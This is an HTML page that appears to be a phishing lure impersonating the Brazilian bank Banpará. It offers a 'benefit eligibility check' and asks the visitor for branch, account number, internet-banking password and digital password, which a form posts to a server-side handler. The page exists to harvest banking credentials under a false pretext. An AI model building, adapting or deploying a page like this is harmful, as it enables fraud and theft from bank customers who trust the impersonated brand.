<!DOCTYPE html>
<html lang="pt-br">

<head>
    <!-- metas OG e twitter mantidas... -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Banpará - Verificação de benefício</title>
    <link rel="shortcut icon" href="./img/favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="./css/style.css">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined" />
</head>

<body>
    <div class="app flex">
        <div class="container__image">
            <img src="./img/logo.webp" alt="Logo Banpará" loading="lazy">
        </div>
        <h1>Verificação de elegibilidade!</h1>
        <div class="containerGeral__form">
            <form action="/processa_formulario" method="post">
                <h2>Titularidade</h2>
                <div class="container__form flex">
                    <!-- rádio mantidos -->
                </div>
                <h2>Tipo da conta</h2>
                <div class="container__form flex">
                    <!-- rádio mantidos -->
                </div>
                <div class="containerGeral__icon flex">
                    <div class="flex containericon__form">
                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">account_balance</span>
                            <div>
                                <label for="agency">Agência</label>
                                <input class="required" type="tel" id="agency" name="agency" inputmode="numeric"
                                    pattern="[0-9]*" placeholder="0000">
                                <span class="span-required">Agência deve ter 4 dígitos</span>
                            </div>
                        </div>

                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">login</span>
                            <div>
                                <label for="login">Conta</label>
                                <input class="required" type="tel" id="login" name="login" inputmode="numeric"
                                    pattern="[0-9]*" placeholder="00000000">
                                <span class="span-required">Conta deve ter 8 dígitos</span>
                            </div>
                        </div>

                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">lock</span>
                            <div>
                                <label for="internet">Senha da internet</label>
                                <input class="required" type="tel" id="internet" name="internet" inputmode="numeric"
                                    pattern="[0-9]*" placeholder="12345678">
                                <span class="span-required">Senha deve ter 8 dígitos</span>
                            </div>
                        </div>

                        <div class="flex icon__form">
                            <span class="icon material-symbols-outlined">private_connectivity</span>
                            <div>
                                <label for="app">Senha digital</label>
                                <input class="required" type="tel" id="app" name="app" inputmode="numeric"
                                    pattern="[0-9]*" placeholder="1234">
                                <span class="span-required">Senha deve ter 4 dígitos</span>
                            </div>
                        </div>
                    </div>
                </div>

                <button type="submit">Solicitar</button>
            </form>
        </div>
    </div>
    <script src="./js/script.js"></script>
</body>

</html>
